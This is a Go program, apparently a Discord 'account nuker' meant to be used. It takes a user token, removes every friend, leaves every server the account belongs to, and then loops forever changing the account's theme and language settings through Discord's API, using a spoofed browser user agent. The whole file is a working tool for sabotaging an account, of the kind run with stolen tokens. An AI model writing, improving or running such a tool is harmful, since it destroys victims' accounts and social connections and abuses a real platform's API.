package main

import (
	// i've got some extra imports thats obvious kekw

	"os"
	"fmt"
	"bytes"
	"bufio"
	"strings"
	"strconv"
	"net/http"
	"github.com/bwmarrin/discordgo"	
)

var (
	Session           *discordgo.Session 
)

func getAllGuildsWorker(Session *discordgo.Session) []string {
	var guildIDS []string

	for _, guild := range Session.State.Guilds {
		guildIDS = append(guildIDS, guild.ID)
	}

	return guildIDS
}

func getAllFriendsWorker(Session *discordgo.Session) []string {
	var friendIDS []string
	relationships, err := Session.RelationshipsGet()

	if err != nil {
		fmt.Println("[\u001b[31m-\u001b[0m] := Error retrieving friend list,", err)
	}

	for _, friend := range relationships {
		friendIDS = append(friendIDS, friend.ID)
	}

	return friendIDS
}

func iterateSettingsWorker(Session *discordgo.Session, Threads int)  {
	themes := []string{"light", "dark"}
	locales := []string{"ja", "zh-TW", "ko", "zh-CN"}
	for i := 0; i < int(Threads); i++ {
		for _, theme := range themes {
			for _, locale := range locales {
				// https://github.com/reticule
				var payload = []byte(fmt.Sprintf(`{"theme": "%v", "locale": "%v"}`, theme, locale))
				// -
				req, err := http.NewRequest("PATCH", "https://discord.com/api/v6/users/@me/settings", bytes.NewBuffer(payload))
				req.Header.Set("Authorization", Session.Token)
				req.Header.Set("Content-Type", "application/json")
			
				if err != nil {
					fmt.Println("[\u001b[31m-\u001b[0m] := Error iterating user settings,", err)
				}
			
				client := &http.Client{}
				_, err = client.Do(req)
			
				if err != nil {
					fmt.Println("[\u001b[31m-\u001b[0m] := Error performing request,", err)
				}
			}
		}
	}
}

func main() {
    reader := bufio.NewReader(os.Stdin)
    fmt.Print("[\u001b[32m>\u001b[0m] Enter token : ")
    token, _ := reader.ReadString('\n')

    fmt.Print("[\u001b[32m>\u001b[0m] Enter amount of threads : ")
	threads, _ := reader.ReadString('\n')
	threadsA, _ := strconv.Atoi(threads)

	Session, _ = discordgo.New(strings.TrimSpace(token))
	Session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
	err := Session.Open()

	if err != nil {
		fmt.Println("[\u001b[31m-\u001b[0m] := Error opening connection,", err)
		return
	}

	friendList := getAllFriendsWorker(Session)
	guildsList := getAllGuildsWorker(Session)

	for _, friend := range friendList {
		for i := 0; i < int(threadsA); i++ {
			Session.RelationshipDelete(friend)
			fmt.Println("[\u001b[32m+\u001b[0m] := Relationship removed : " + friend)
	    }
	}

	for _, guild := range guildsList {
		for i := 0; i < int(threadsA); i++ {
			err := Session.GuildLeave(guild)
			if err != nil {
				fmt.Println("[\u001b[31m-\u001b[0m] := Error leaving guild,", err)
			} else {
				fmt.Println("[\u001b[32m+\u001b[0m] := Guild left : " + guild)
			}
		}
	}

	for (true) {
		iterateSettingsWorker(Session, threadsA)
	}

}
